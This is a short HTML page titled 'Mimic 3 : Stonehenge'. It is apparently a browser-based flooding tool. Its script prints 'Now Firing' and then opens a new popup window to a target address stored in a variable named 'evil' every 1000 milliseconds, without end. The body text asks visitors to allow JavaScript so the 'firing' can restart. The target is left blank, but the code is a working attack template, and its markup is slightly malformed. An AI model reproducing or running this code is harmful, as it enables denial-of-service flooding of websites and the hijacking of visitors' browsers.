<meta https-equiv="content-type"content="utf-8ul">
<head>
	<title>Mimic 3 : Stonehenge</title>
	<script>
		var com0='Now Firing';
		var evil='';
		var interval=1000;//1s=1000
		var txt ='<tt>'
				+'<br>'+com0
				+'<br><br>Target:'+evil
				+'<br><br>Launch speed: '+interval
				+' ms / 1 attack'
				+'</tt>'
				;
		var i=0;
		window.setInterval(function(){
			if(i==0){
				document.write(txt+'<br>');
			}
			i++;
			window.open(evil,null,'top=0,left=0,width=100,height=100');
			},interval
		);
	</script>
</head>
<body>
	<p align="center">
		<span style="font-size:150%;">Mimic 3 is in an interval.<br>If you want to restart to Firing , Allow and Turn on all JavaScripts.</span><br>
